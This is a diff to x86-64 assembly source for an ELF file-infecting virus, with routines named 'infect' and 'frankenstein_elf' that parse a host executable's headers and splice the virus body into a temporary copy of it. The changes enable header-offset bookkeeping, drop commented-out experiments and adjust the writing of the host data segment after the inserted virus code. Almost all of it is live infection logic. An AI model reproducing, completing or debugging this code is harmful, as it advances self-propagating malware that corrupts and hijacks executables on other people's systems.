@@ -848,8 +848,8 @@ infect:
 			add r12w, word [r13 + elf_ehdr.e_shentsize] ;add elf_ehdr.e_phentsize to phdr offset in r12 
 			cmp cx, 0
 			jg .shdr_loop
-;	lea r10, [r13 + elf_ehdr.e_shoff]
-	;mov [SHDR_OFFSET_HOST], r10
+	lea r10, [r13 + elf_ehdr.e_shoff]
+	mov [SHDR_OFFSET_HOST], r10
 	mov r11, [r13 + elf_ehdr.e_shoff]
 ;	mov qword [SHDR_OFFSET_HOST], r11
 	mov dword [oshoff], r11d
@@ -948,42 +948,10 @@ frankenstein_elf:
 		;xor rdx, rdx	
 		mov rdx, [PAGESIZE]
 	.write_host_ehdr_phdrs_textsegment:	
-		;mov rdx, 512
-		;mov rdx, 64
-		;mov rdx, 1024
 		mov rdi, r9
 		lea rsi, [r13 + elf_ehdr]					;r13 contains pointer to mmap'd file
 		mov rax, SYS_WRITE
 		syscall
-
-
-		;push rsi
-	;.lseek_end_phdrs:
-		;mov rdi, r9						; prob unnecessary since this should still be the val in rdi
-		;mov rsi, rdx					;(offset in rsi =hostentryoffset)
-		;mov rdx, SEEK_CUR				;fd set to current position + offset 
-		;mov rax, SYS_LSEEK
-		;syscall
-
-;	.write_padding_until_datasegment:		
-		;mov rdx, evaddr
-		;sub rdx, [hostentry_offset]
-;;		add rdx, hosttext_start
-		;;mov rdx, [hosttext_start]
-		;sub rdx, hostentry_offset
-		;add edx, dword [PAGESIZE - dx]
-		;add rdx, [hostentry_page_offset]
-		;mov rdx, rcx
-
-;;		mov rdi, r9						; prob unnecessary since this should still be the val in rdi
-;;		mov rsi, r13
-;;		mov r10, [hostentry_offset]
-;;		mov rax, SYS_PWRITE64
-;;		syscall
-
-
-	;.lseek_textsegment:
-	
 
 	;.write_hosttextsegment:
 		;;mov rcx, [evaddr]
@@ -997,41 +965,28 @@ frankenstein_elf:
 	;	syscall
 	.write_virus_totemp:
 		mov rdx, vlen
-		;mov rdi, r9						; prob unnecessary since this should still be the val in rdi
 		mov rsi, _start
 		mov r10d, [vxoffset]
 		mov rax, SYS_PWRITE64
 		syscall
 
-		mov rsi, rax	
+		mov rsi, rax
+	
 	;ftruncate syscall will grow the size of file (corresponding to file descriptor fd)
 	; by n bytes, where n is a signed integer, passed in rsi
 	;ftruncate grows the file with null bytes, so this will append nec. padding bytes
 	;before we write the original host data segment to the temp file
 	.write_padding_after_vx:
-		;mov rdx, [padding2data_segment] 
-;		mov rdi, r9						; prob unnecessary since this should still be the val in rdi
 		add esi, dword [data_offset_new_padding]
-		;sub rsi, data_offset_original
 		mov rax, SYS_FTRUNCATE
 		syscall
-		jmp .close_temp		
+;		jmp .close_temp		
 	.write_datasegment_totemp:
 		;mov rdx, [r14 + filestat.st_size]
 		;mov rdx, [SHDR_OFFSET_HOST]
-		mov rdx, [r13 + elf_ehdr.e_shoff]
+		mov rdx, [oshoff]
 		sub edx, dword [data_offset_original]
-
-		;pop rsi		
-;		mov rdi, r9						; prob unnecessary since this should still be the val in rdi
-		;add rsi, data_offset_original
-		;add r13, data_offset_original
-		;add r13d, dword [data_offset_original]
 		mov rsi, [DATA_OFFSET_HOST]
-			
-		;mov r11, r13
-		;add r11d, data_offset_original
-		;lea rsi, [r11]
 		mov r10d, dword [data_offset_new_padding]
 		mov rax, SYS_PWRITE64
 		syscall
